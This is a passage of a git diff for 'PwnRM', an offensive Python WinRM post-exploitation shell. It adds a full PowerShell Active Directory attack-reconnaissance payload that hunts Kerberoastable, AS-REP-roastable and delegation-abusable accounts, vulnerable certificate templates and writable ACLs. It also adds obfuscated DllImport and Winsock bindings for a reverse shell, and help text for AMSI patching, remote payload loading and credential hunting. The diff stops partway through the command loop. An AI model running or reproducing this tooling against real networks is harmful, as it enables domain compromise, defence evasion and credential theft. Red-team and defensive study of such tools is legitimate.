@@ -1,69 +1,318 @@
 #!/usr/bin/env python3
-# PwnRM - A rewritten and enhanced WinRM execution tool based on wmiexec and winrmexec
-# Original credits: evil_winrmexec.py (source not specified in attachment)
-# Credits: GitHub - uziii2208
+# ─────────────────────────────────────────────────────────────────────────────
+#  PwnRM  v1.0.0  —  Advanced WinRM / AD Post-Exploitation Shell
+#  Author : uziii2208  |  https://github.com/uziii2208/PwnRM
+#  License: MIT
+# ─────────────────────────────────────────────────────────────────────────────
+#  Based on the original wmiexec / winrmexec concept.
+#  v1.0.0 adds: rich CLI banner, tab-completion, coloured output, session
+#  metadata, and the new  !adtriage  AD-enumeration module.
+# ─────────────────────────────────────────────────────────────────────────────
 
-import os, sys, re, logging, time, shlex
+import os, sys, re, logging, time, shlex, textwrap
 from signal import SIGINT, signal, getsignal
 from pathlib import PureWindowsPath, Path
 from argparse import ArgumentParser
 from ipaddress import ip_address
-
 from base64 import b64encode, b64decode
 from random import randbytes, randint
+from datetime import datetime
 
 from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
-
 from Cryptodome.Hash import MD5
 
-# Assuming winrmexec.py is available or renamed to core.py for modularity
-# For this rewrite, we'll assume the imports are adjusted if needed. If winrmexec is a separate file,
-# you may need to rename or copy it accordingly. Here, we'll inline the necessary parts or assume it's imported.
-from core import Runspace, create_transport, argument_parser  # Adjusted import name
+from core import Runspace, create_transport, argument_parser   # core.py
 
-# pip install prompt_toolkit
-from prompt_toolkit import prompt, ANSI
-from prompt_toolkit.history import FileHistory
-prompt_toolkit_available = sys.stdout.isatty()
+try:
+    from prompt_toolkit import prompt, ANSI
+    from prompt_toolkit.history import FileHistory
+    from prompt_toolkit.completion import WordCompleter
+    _PTK = sys.stdout.isatty()
+except ImportError:
+    _PTK = False
 
-# ASCII Art for PwnRM
-PWN_RM_ASCII = r"""
- ____  _      _      ____  _     
-╱  __╲╱ ╲  ╱│╱ ╲  ╱│╱  __╲╱ ╲__╱│  GitHub: uziii2208
-│  ╲╱││ │  │││ │╲ │││  ╲╱││ │╲╱││  =====================================================================
-│  __╱│ │╱╲│││ │ ╲│││    ╱│ │  ││  [+] A WinRM remote management shell with upload/download,
-╲_╱   ╲_╱  ╲│╲_╱  ╲│╲_╱╲_╲╲_╱  ╲│  amsi bypass, .NET assembly execution, and reverse shell capabilities.
-                                 
+# ── ANSI palette ─────────────────────────────────────────────────────────────
+R  = "\x1b[31m";  G  = "\x1b[32m";  Y  = "\x1b[33m"
+B  = "\x1b[34m";  M  = "\x1b[35m";  C  = "\x1b[36m"
+W  = "\x1b[37m";  DIM = "\x1b[2m";  BLD = "\x1b[1m"
+RST = "\x1b[0m"
+
+def c(col, s):  return f"{col}{s}{RST}"
+
+# ── Banner ────────────────────────────────────────────────────────────────────
+_BANNER = rf"""
+{M}{BLD}
+  ██████╗ ██╗    ██╗███╗   ██╗██████╗ ███╗   ███╗
+  ██╔══██╗██║    ██║████╗  ██║██╔══██╗████╗ ████║
+  ██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██╔████╔██║
+  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
+  ██║     ╚███╔███╔╝██║ ╚████║██║  ██║██║ ╚═╝ ██║
+  ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
+{RST}{DIM}  Advanced WinRM / AD Post-Exploitation Shell  {BLD}v1.0.0{RST}
+{DIM}  github.com/uziii2208/PwnRM  ·  For authorized engagements only.{RST}
 """
 
-# -- helpers and constants: -----------------------------------------------------------------------
-def chunks(xs, n): # TODO: since 3.12 python has itertools.batched
+# ── Tab-completion word list ──────────────────────────────────────────────────
+_COMPLETIONS = [
+    "!download", "!upload", "!amsi", "!psrun", "!netrun",
+    "!revshell", "!log", "!stoplog", "!adtriage", "!sysinfo",
+    "!creds", "!help", "exit", "quit",
+    # common PS one-liners operators may want fast access to:
+    "Get-Process", "Get-Service", "whoami", "ipconfig", "net user",
+    "net localgroup administrators", "systeminfo",
+]
+
+# ── AD Triage PowerShell payloads ─────────────────────────────────────────────
+# Self-contained LDAP/WMI enumeration that runs entirely inside the remote
+# PowerShell session — no extra tools required on the target.
+_ADTRIAGE_PS = r"""
+function Invoke-PwnRMTriage {
+    param([switch]$Quick)
+    $sep = '=' * 72
+    function hdr($t) { Write-Host "`n$sep`n  [*] $t`n$sep" -ForegroundColor Cyan }
+    function ok($m)  { Write-Host "  [+] $m" -ForegroundColor Green }
+    function inf($m) { Write-Host "  [-] $m" }
+    function wrn($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }
+
+    # ── 0. Basic identity ────────────────────────────────────────────────────
+    hdr "Identity & Session"
+    $me = [Security.Principal.WindowsIdentity]::GetCurrent()
+    ok  "User     : $($me.Name)"
+    ok  "SID      : $($me.User)"
+    $groups = $me.Groups | ForEach-Object { try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value } }
+    ok  "Groups   : $($groups -join ', ')"
+    $privs = whoami /priv 2>$null | Select-String "Se\w+" | ForEach-Object { ($_ -split '\s{2,}')[0].Trim() }
+    ok  "Privs    : $($privs -join ', ')"
+
+    # ── 1. Domain basics ─────────────────────────────────────────────────────
+    hdr "Domain Basics"
+    try {
+        $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+        ok  "Domain   : $($dom.Name)"
+        ok  "Forest   : $($dom.Forest.Name)"
+        $dcs = $dom.DomainControllers | Select -Expand Name
+        ok  "DCs      : $($dcs -join ', ')"
+        $trusts = $dom.GetAllTrustRelationships()
+        if ($trusts) { $trusts | ForEach-Object { wrn "Trust → $($_.TargetName)  [$($_.TrustType) / $($_.TrustDirection)]" } }
+        else { inf "No external trusts found." }
+
+        # ── OS version check → flag Server 2025 (BadSuccessor) ──────────────
+        foreach ($dc in $dom.DomainControllers) {
+            $os = $dc.OSVersion
+            if ($os -match "2025") {
+                wrn "DC $($dc.Name) runs Windows Server 2025 → check BadSuccessor (dMSA)!"
+            } else { inf "DC $($dc.Name) OS: $os" }
+        }
+    } catch { wrn "Could not query domain: $_" }
+
+    if ($Quick) { return }
+
+    # ── 2. High-value groups ──────────────────────────────────────────────────
+    hdr "High-Value Group Members"
+    $hvg = @("Domain Admins","Enterprise Admins","Schema Admins",
+             "Administrators","Account Operators","Backup Operators",
+             "DNSAdmins","Group Policy Creator Owners","Remote Management Users")
+    $root = "LDAP://$(([adsi]'').distinguishedName)"
+    foreach ($g in $hvg) {
+        try {
+            $grp = [adsi]"LDAP://CN=$g,CN=Users,$(([adsi]'').distinguishedName)"
+            if (-not $grp.Path) {
+                # Try common OUs
+                $s = New-Object DirectoryServices.DirectorySearcher([adsi]$root)
+                $s.Filter = "(&(objectCategory=group)(cn=$g))"
+                $grp = $s.FindOne().GetDirectoryEntry()
+            }
+            $members = @($grp.member)
+            if ($members.Count -gt 0) {
+                ok "$g ($($members.Count) member(s)):"
+                $members | ForEach-Object { inf "    $_" }
+            }
+        } catch { }
+    }
+
+    # ── 3. Kerberoastable SPNs ────────────────────────────────────────────────
+    hdr "Kerberoastable Accounts (SPNs on user objects)"
+    $s = New-Object DirectoryServices.DirectorySearcher([adsi]$root)
+    $s.Filter = "(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $s.PropertiesToLoad.AddRange(@("sAMAccountName","servicePrincipalName","memberOf","adminCount","pwdLastSet"))
+    $s.PageSize = 1000
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." }
+    $res | ForEach-Object {
+        $sam  = $_.Properties["samaccountname"][0]
+        $spns = $_.Properties["serviceprincipalname"]
+        $adm  = if ($_.Properties["admincount"][0] -eq 1) { " [adminCount=1!]" } else { "" }
+        ok "${sam}${adm}"
+        $spns | ForEach-Object { inf "    SPN: $_" }
+    }
+
+    # ── 4. AS-REP roastable accounts ─────────────────────────────────────────
+    hdr "AS-REP Roastable (DONT_REQ_PREAUTH)"
+    $s.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName"))
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." } else { $res | ForEach-Object { ok $_.Properties["samaccountname"][0] } }
+
+    # ── 5. Unconstrained delegation ───────────────────────────────────────────
+    hdr "Unconstrained Delegation"
+    $s.Filter = "(&(|(objectCategory=computer)(objectCategory=user))(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","objectCategory"))
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." }
+    $res | ForEach-Object {
+        wrn "$($_.Properties["samaccountname"][0])  ← coerce + capture TGT → DCSync"
+    }
+
+    # ── 6. Constrained delegation (including S4U2Self) ────────────────────────
+    hdr "Constrained Delegation (msDS-AllowedToDelegateTo)"
+    $s.Filter = "(msDS-AllowedToDelegateTo=*)"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl"))
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." }
+    $res | ForEach-Object {
+        $proto = if (($_.Properties["useraccountcontrol"][0] -band 0x1000000) -ne 0) { "(Protocol-Transition / S4U2Self)" } else { "" }
+        ok "$($_.Properties["samaccountname"][0]) $proto"
+        $_.Properties["msds-allowedtodelegateto"] | ForEach-Object { inf "    → $_" }
+    }
+
+    # ── 7. Resource-Based Constrained Delegation ──────────────────────────────
+    hdr "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set)"
+    $s.Filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName"))
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." }
+    $res | ForEach-Object { wrn "$($_.Properties["samaccountname"][0])  ← RBCD writable" }
+
+    # ── 8. ADCS — Certificate Templates ──────────────────────────────────────
+    hdr "ADCS — Vulnerable Certificate Templates (ESC1/ESC3/ESC4 quick scan)"
+    try {
+        $pki = "CN=Configuration," + ([adsi]'').distinguishedName
+        $s2  = New-Object DirectoryServices.DirectorySearcher([adsi]"LDAP://$pki")
+        $s2.Filter = "(objectClass=pKICertificateTemplate)"
+        $s2.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag","pKIExtendedKeyUsage","nTSecurityDescriptor"))
+        $s2.PageSize = 500
+        $tpls = $s2.FindAll()
+        $esc_count = 0
+        $tpls | ForEach-Object {
+            $cn    = $_.Properties["cn"][0]
+            $cnf   = [int]$_.Properties["mspki-certificate-name-flag"][0]
+            $enf   = [int]$_.Properties["mspki-enrollment-flag"][0]
+            $ekus  = @($_.Properties["pkiextendedkeyusage"])
+            # ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) + client auth EKU
+            $clientAuth = $ekus -contains "1.3.6.1.5.5.7.3.2"
+            if (($cnf -band 0x1) -and $clientAuth) {
+                wrn "ESC1 candidate : $cn  (enrollee supplies SAN + Client Auth)"
+                $esc_count++
+            }
+            # ESC3: Certificate Request Agent EKU
+            if ($ekus -contains "1.3.6.1.4.1.311.20.2.1") {
+                wrn "ESC3 candidate : $cn  (Certificate Request Agent EKU)"
+                $esc_count++
+            }
+            # ESC4: if WRITE rights for low-priv — need ACL inspection
+            if ($enf -band 0x200) {   # CT_FLAG_PUBLISHED_IN_DS
+                inf "Template $cn is published — check ACLs with Certipy for ESC4/ESC9"
+            }
+        }
+        if ($esc_count -eq 0) { inf "No obvious ESC1/ESC3 templates. Run Certipy for full ADCS audit." }
+    } catch { inf "Could not enumerate ADCS (not joined to PKI or no ADCS role): $_" }
+
+    # ── 9. gMSA / dMSA accounts ───────────────────────────────────────────────
+    hdr "gMSA / dMSA Accounts"
+    $s.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","msDS-GroupMSAMembership","distinguishedName"))
+    $gmsa = $s.FindAll()
+    if ($gmsa.Count -eq 0) { inf "No gMSA found." }
+    $gmsa | ForEach-Object {
+        ok "gMSA: $($_.Properties["samaccountname"][0])"
+        inf "    DN: $($_.Properties["distinguishedname"][0])"
+    }
+    $s.Filter = "(objectClass=msDS-DelegatedManagedServiceAccount)"
+    $dmsa = $s.FindAll()
+    if ($dmsa.Count -eq 0) { inf "No dMSA found." }
+    $dmsa | ForEach-Object {
+        wrn "dMSA: $($_.Properties["samaccountname"][0]) ← potential BadSuccessor target"
+    }
+
+    # ── 10. ACL quick-wins (WriteDACL / GenericAll / GenericWrite) ────────────
+    hdr "ACL Quick-Wins (DA/EA/DC objects)"
+    # Check if current user has interesting rights on DA/DC objects
+    $targets = @("Domain Admins","Domain Controllers","krbtgt")
+    $me_sam  = ($me.Name -split '\\')[-1]
+    foreach ($t in $targets) {
+        try {
+            $obj  = (New-Object DirectoryServices.DirectorySearcher([adsi]$root,"(sAMAccountName=$t)")).FindOne()
+            if ($obj) {
+                $de   = $obj.GetDirectoryEntry()
+                $acl  = $de.ObjectSecurity.Access
+                $hit  = $acl | Where-Object {
+                    ($_.IdentityReference -match [regex]::Escape($me_sam) -or
+                     $_.IdentityReference -match "Everyone|Authenticated Users") -and
+                    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword")
+                }
+                if ($hit) { $hit | ForEach-Object { wrn "ACL on $t : $($_.IdentityReference) → $($_.ActiveDirectoryRights)" } }
+                else { inf "No obvious writable ACLs on $t for current identity." }
+            }
+        } catch { }
+    }
+
+    # ── 11. Pre-Windows 2000 compatible access ────────────────────────────────
+    hdr "Pre-Windows 2000 Compatible Access"
+    try {
+        $compat = [adsi]"LDAP://CN=Pre-Windows 2000 Compatible Access,CN=Builtin,$($([adsi]'').distinguishedName)"
+        $members = $compat.member
+        if ($members -match "S-1-1-0|S-1-5-7") {
+            wrn "Anonymous / Everyone in 'Pre-Windows 2000 Compatible Access' → anonymous LDAP reads possible!"
+        } else { inf "Group appears restricted." }
+    } catch { }
+
+    # ── 12. Enabled local Administrators check ────────────────────────────────
+    hdr "Local Admin Candidates (enabled, password never expires)"
+    $s.Filter = "(&(objectCategory=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=65536)(adminCount=1))"
+    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName","pwdLastSet"))
+    $res = $s.FindAll()
+    if ($res.Count -eq 0) { inf "None found." }
+    $res | ForEach-Object {
+        $pls = $_.Properties["pwdlastset"][0]
+        $d   = if ($pls) { [datetime]::FromFileTime($pls).ToString("yyyy-MM-dd") } else { "never" }
+        wrn "$($_.Properties["samaccountname"][0])  ← password never expires, last set: $d"
+    }
+
+    Write-Host "`n$sep" -ForegroundColor Cyan
+    Write-Host "  [*] Triage complete. Next steps:" -ForegroundColor Cyan
+    Write-Host "  [-]  Kerberoast : GetUserSPNs.py / nxc ldap -M kerberoast" -ForegroundColor White
+    Write-Host "  [-]  AS-REP     : GetNPUsers.py / nxc ldap --asreproast" -ForegroundColor White
+    Write-Host "  [-]  ADCS       : certipy find --vulnerable / nxc ldap -M adcs" -ForegroundColor White
+    Write-Host "  [-]  BadSucces. : nxc ldap -M badsuccessor (Server 2025 DCs)" -ForegroundColor White
+    Write-Host "  [-]  BloodHound : bloodhound-python -d DOMAIN -u user -p pass" -ForegroundColor White
+    Write-Host "$sep`n" -ForegroundColor Cyan
+}
+
+Invoke-PwnRMTriage -Quick:$([bool]::Parse('__QUICK__'))
+"""
+
+# ── helpers ───────────────────────────────────────────────────────────────────
+def chunks(xs, n):
     for off in range(0, len(xs), n):
         yield xs[off:off+n]
 
 def b64str(s):
     if isinstance(s, str):
         return b64encode(s.encode()).decode()
-    else:
-        return b64encode(s).decode()
+    return b64encode(s).decode()
 
 def split_args(cmdline):
     try:
         args = shlex.split(cmdline, posix=False)
     except ValueError:
         return []
-
-    fixed = []
-    for arg in args:
-        if arg.startswith('"') and arg.endswith('"'):
-            fixed.append(arg[1:-1])
-        elif arg.startswith("'") and arg.endswith("'"):
-            fixed.append(arg[1:-1])
-        else:
-            fixed.append(arg)
-    return fixed
+    return [
+        a[1:-1] if (a.startswith('"') and a.endswith('"')) or
+                   (a.startswith("'") and a.endswith("'")) else a
+        for a in args
+    ]
 
 def xorenc(xs, key):
     return bytes(x ^ key for x in xs)
@@ -71,11 +320,11 @@ def xorenc(xs, key):
 class CtrlCHandler:
     def __init__(self, max_interrupts=4, timeout=5):
         self.max_interrupts = max_interrupts
-        self.timeout = timeout
+        self.timeout        = timeout
 
     def __enter__(self):
-        self.interrupted = 0
-        self.released = False
+        self.interrupted      = 0
+        self.released         = False
         self.original_handler = getsignal(SIGINT)
 
         def handler(signum, frame):
@@ -83,209 +332,223 @@ class CtrlCHandler:
             if self.interrupted > 1:
                 n = self.max_interrupts - self.interrupted + 2
                 print()
-                print(f"Ctrl+C spammed, {n} more will terminate ungracefully.")
-                print(f"Try waiting ~{self.timeout} more seconds for a client to get a "\
-                        "chance to send the interrupt")
-
+                print(c(Y, f"  [!] Ctrl+C spam detected — {n} more will force-terminate."))
+                print(c(DIM, f"      Wait ~{self.timeout}s for the remote session to receive the interrupt."))
             if self.interrupted > self.max_interrupts:
                 self.release()
 
         signal(SIGINT, handler)
         return self
 
-    def __exit__(self, type, value, tb):
+    def __exit__(self, *_):
         self.release()
 
     def release(self):
         if self.released:
             return False
-
         signal(SIGINT, self.original_handler)
         self.released = True
         return True
 
-# -- some types and imports for upload/download/amsi/netrun/psrun functionality: ------------------
-_ns = "A" + randbytes(randint(3,8)).hex()
-
-# a workaround for getting a streaming console output from dynamically loaded .NET assemblies:
-_host_writer = "H" + randbytes(randint(3,8)).hex()
-new_HostWriter = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
-import_HostWriter = """
+# ── random identifiers used for reflective .NET loading ──────────────────────
+_ns         = "A" + randbytes(randint(3,8)).hex()
+_host_writer= "H" + randbytes(randint(3,8)).hex()
+new_HostWriter   = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
+import_HostWriter = f"""
 Add-Type -TypeDefinition @"
-namespace _NS {
-public class _HOSTWRITER : System.IO.TextWriter {
-  private System.Action<string> _act;
-  public _HOSTWRITER(System.Action<string> act) { _act = act; }
-  public override void Write(char v) { _act(v.ToString()); }
-  public override void Write(string v) { _act(v); }
-  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
-  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
+namespace {_ns} {{
+    public class {_host_writer} : System.IO.TextWriter {{
+        private System.Action<string> _act;
+        public {_host_writer}(System.Action<string> act) {{ _act = act; }}
+        public override void Write(char v)   {{ _act(v.ToString()); }}
+        public override void Write(string v) {{ _act(v); }}
+        public override void WriteLine(string v) {{ _act(v + System.Environment.NewLine); }}
+        public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encoding.UTF8; }} }}
+    }}
 }}
-"@""".replace("_NS", _ns).replace("_HOSTWRITER", _host_writer)
-del _host_writer
+"@"""
 
-# it is way too slow to do this in powershell for large files:
 _xor_enc = "X" + randbytes(randint(3,8)).hex()
 _xor_key = randint(1,255)
-call_XorEnc = f"[{_ns}.{_xor_enc}]::x"
-import_XorEnc = """
+call_XorEnc  = f"[{_ns}.{_xor_enc}]::x"
+import_XorEnc = f"""
 Add-Type @"
-namespace _NS {
-public class _XORENC {
-  public static byte[] x(byte[] y) {
-    for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
-    return y;
-  }
+namespace {_ns} {{
+    public class {_xor_enc} {{
+        public static byte[] x(byte[] y) {{
+            for(int i = 0; i < y.Length; i++) {{ y[i] ^= {_xor_key}; }}
+            return y;
+        }}
+    }}
 }}
 "@
-""".replace("_NS", _ns).replace("_KEY", str(_xor_key)).replace("_XORENC", _xor_enc)
+"""
 del _xor_enc
 
-# zipping files on windows will have \ as path separators and some linux tools bork:
-_path_fix = "P" + randbytes(randint(3,8)).hex()
+_path_fix  = "P" + randbytes(randint(3,8)).hex()
 _new_PathFix = f"(New-Object {_ns}.{_path_fix})"
-_importPathFix = """
+_importPathFix = f"""
 Add-Type @"
-namespace _NS {
-public class _PATHFIX : System.Text.UTF8Encoding {
-  public override byte[] GetBytes(string s) {
-    s=s.Replace("\\\\", "/");
-    return base.GetBytes(s);
-  }
+namespace {_ns} {{
+    public class {_path_fix} : System.Text.UTF8Encoding {{
+        public override byte[] GetBytes(string s) {{
+            s=s.Replace("\\\\\\\\", "/");
+            return base.GetBytes(s);
+        }}
+    }}
 }}
 "@
-""".replace("_NS", _ns).replace("_PATHFIX", _path_fix)
+"""
 del _path_fix
 
-# mangle DllImports a little:
 def dll_import(ns, lib, fun, sigs):
     cls  = f"f{randbytes(randint(3,8)).hex()}"
     name = f"g{randbytes(randint(3,8)).hex()}"
     ret  = sigs[0]
     args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
-    dll = "+".join(f'"{c}"' for c in lib)
-    entry = "+".join(f'"{c}"' for c in fun)
+    dll  = "+".join(f'"{c_}"' for c_ in lib)
+    entry= "+".join(f'"{c_}"' for c_ in fun)
     code = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
     globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
-    globals()["_import_" + fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""
+    globals()["_import_" + fun] = f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"
 
-# this will add _import_LoadLibrary and _call_LoadLibrary variables in global scope:
-dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr", "string"])
-dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr", "IntPtr", "string"])
-dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr", "IntPtr", "IntPtr", "uint", "out uint"])
-dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr", "IntPtr", "string", "IntPtr", "IntPtr", "bool", "uint", "IntPtr", "IntPtr", "Int64[]", "byte[]"])
-dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr", "short", "byte[]"])
-dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"])
-dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"])
+dll_import(_ns,"kernel32","LoadLibrary",  ["IntPtr","string"])
+dll_import(_ns,"kernel32","GetProcAddress",["IntPtr","IntPtr","string"])
+dll_import(_ns,"kernel32","VirtualProtect",["IntPtr","IntPtr","IntPtr","uint","out uint"])
+dll_import(_ns,"kernel32","CreateProcess", ["IntPtr","IntPtr","string","IntPtr","IntPtr","bool","uint","IntPtr","IntPtr","Int64[]","byte[]"])
+dll_import(_ns,"ws2_32",  "WSAStartup",   ["IntPtr","short","byte[]"])
+dll_import(_ns,"ws2_32",  "WSASocket",    ["IntPtr","uint","uint","uint","IntPtr","uint","uint"])
+dll_import(_ns,"ws2_32",  "WSAConnect",   ["IntPtr","IntPtr","byte[]","int","IntPtr","IntPtr","IntPtr","IntPtr"])
 del _ns
 
-# when splicing strings into powershell scripts use this so not to worry about escaping chars, etc:
 def str_b64(arg):
     return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"
 
+# ── PwnShell ──────────────────────────────────────────────────────────────────
 class PwnShell:
-    def __init__(self, runspace):
-        self.runspace  = runspace
-        self.cwd        = ""
-        self.stdout_log = None
-        self.need_clear = False
 
-        if prompt_toolkit_available:
+    VERSION = "1.0.0"
+
+    def __init__(self, runspace, target_info: dict | None = None):
+        self.runspace    = runspace
+        self.cwd         = ""
+        self.stdout_log  = None
+        self.need_clear  = False
+        self.start_time  = datetime.now()
+        self.target_info = target_info or {}
+        self.cmd_count   = 0
+
+        if _PTK:
             self.prompt_history = FileHistory(".pwnrm_history")
+            self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)
 
     def __del__(self):
         self.stop_log()
 
+    # ── logging ───────────────────────────────────────────────────────────────
     def start_log(self):
         if not self.stdout_log:
-            logfile = f"pwnrm_{int(time.time())}_stdout.log"
-            self.write_info(f"logging output to {logfile}")
-            self.stdout_log = open(logfile, "wb")
+            fn = f"pwnrm_{int(time.time())}_stdout.log"
+            self.write_info(f"Logging to {c(C, fn)}")
+            self.stdout_log = open(fn, "wb")
 
     def stop_log(self):
         if self.stdout_log:
             self.stdout_log.close()
             self.stdout_log = None
 
+    # ── help / banner ─────────────────────────────────────────────────────────
     def help(self):
-        print(PWN_RM_ASCII)
-        print()
-        print("Ctrl+D to exit, Ctrl+C will gracefully interrupt the current operation")
-        print("\x1b[1m\x1b[31mNote: This is a command shell, not a fully interactive terminal!\x1b[0m")
-        print("For interactive programs or processes expecting stdin input, use !revshell")
-        print()
-        print("Available Commands:")
-        print("  !download RPATH [LPATH]          # Retrieve a file/directory from target (directories")
-        print("                                   # are compressed as ZIP); quote paths containing spaces")
-        print()
-        print("  !upload [-xor] LPATH [RPATH]     # Send a file to target; optionally encrypt with XOR")
-        print("                                   # for use with !psrun/!netrun; slower than direct transfer")
-        print("                                   # Consider using IWR if network connectivity permits")
-        print()
-        print("  !amsi                            # Disable AMSI (run before loading .NET assemblies)")
-        print()
-        print("  !psrun [-xor] URL                # Execute PowerShell script via URL; uses obfuscated")
-        print("                                   # script block execution to bypass AMSI if needed")
-        print("                                   # Use -xor flag when loading XOR-encrypted scripts")
-        print()
-        print("  !netrun [-xor] URL [ARG] [ARG]   # Execute .NET assembly from URL with optional arguments")
-        print("                                   # Run !amsi first if encountering format errors")
-        print("                                   # Use -xor flag for encrypted assemblies")
-        print()
-        print("  !revshell IP PORT                # Establish reverse shell with full stdin/stdout/stderr")
-        print("                                   # Use for processes requiring interactive I/O")
-        print("                                   # Example stdin redirection:")
-        print("                                   # PS> Set-Content -Encoding ASCII 'input.txt' \"data\"")
-        print("                                   # PS> Start-Process prog.exe -RedirectStandardInput 'input.txt'")
-        print()
-        print("  !log                             # Enable session logging to pwnrm_[timestamp]_stdout.log")
-        print("  !stoplog                         # Disable session logging")
-        print()
-        print("ENJOY YOUR MEAL :)")
+        elapsed = str(datetime.now() - self.start_time).split(".")[0]
+        tgt = self.target_info.get("host","?")
+        usr = self.target_info.get("user","?")
 
-    def repl(self, inputs=None, debug=True):
+        print(_BANNER)
+        print(textwrap.dedent(f"""\
+        {BLD}  Session Info{RST}
+          Target  : {c(C,tgt)}
+          User    : {c(G,usr)}
+          Elapsed : {elapsed}    Commands run: {self.cmd_count}
+
+        {BLD}  Key Commands{RST}
+
+          {c(Y,'!download')} RPATH [LPATH]          Pull file/dir (dirs → ZIP)
+          {c(Y,'!upload')} [-xor] LPATH [RPATH]     Push file; -xor for stealthy staging
+          {c(Y,'!amsi')}                             Patch AmsiScanBuffer in-process
+          {c(Y,'!psrun')} [-xor] URL                Load & exec remote PS1 (obfuscated ScriptBlock)
+          {c(Y,'!netrun')} [-xor] URL [ARG..]        Load & exec remote .NET assembly
+          {c(Y,'!revshell')} IP PORT                 Raw Winsock reverse shell (full I/O)
+          {c(Y,'!adtriage')} [-q]                    {c(M,'[NEW]')} AD post-auth recon:
+                                               SPNs · AS-REP · delegation · ADCS·
+                                               gMSA/dMSA · ACL quick-wins · BadSuccessor
+          {c(Y,'!sysinfo')}                          Quick OS / AV / hotfix snapshot
+          {c(Y,'!creds')}                            DPAPI / PowerShell history / credential hint
+          {c(Y,'!log')} / {c(Y,'!stoplog')}                  Toggle session transcript
+          exit / quit / Ctrl+D               Close session
+          Ctrl+C                             Gracefully interrupt running command
+
+        {c(DIM,'  Tab-completion available for all ! commands.')}
+        """))
+
+    # ── REPL ──────────────────────────────────────────────────────────────────
+    def repl(self, inputs=None):
         self.update_cwd()
-        for cmd in map(str.strip, inputs or self.read_line()):
+
+        for raw in (inputs or self.read_line()):
+            cmd = raw.strip()
             if not cmd:
                 continue
-            elif cmd in { "exit", "quit", "!exit", "!quit" }:
-                return
-            elif cmd.startswith("!download "):
-                self.download(cmd.removeprefix("!download "))
-            elif cmd.startswith("!upload "):
-                self.upload(cmd.removeprefix("!upload "))
-            elif cmd.startswith("!amsi"):
-                self.amsi_bypass()
-            elif cmd.startswith("!netrun "):
-               self.netrun(cmd.removeprefix("!netrun "))
-            elif cmd.startswith("!psrun "):
-               self.psrun(cmd.removeprefix("!psrun "))
-            elif cmd.startswith("!revshell "):
-                self.revshell(cmd.removeprefix("!revshell "))
-            elif cmd.startswith("!log"):
-                self.start_log()
-            elif cmd.startswith("!stoplog"):
-                self.stop_log()
-            elif cmd.startswith("!") or cmd in { "help", "?" }:
-                self.help()
-            else:
-                if self.stdout_log:
-                    self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
-                    self.stdout_log.flush()
-                self.run_with_interrupt(cmd, self.write_line)
-                self.update_cwd()
+            self.cmd_count += 1
 
+            if cmd in {"exit","quit","!exit","!quit"}:
+                print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
+                return
+
+            dispatch = [
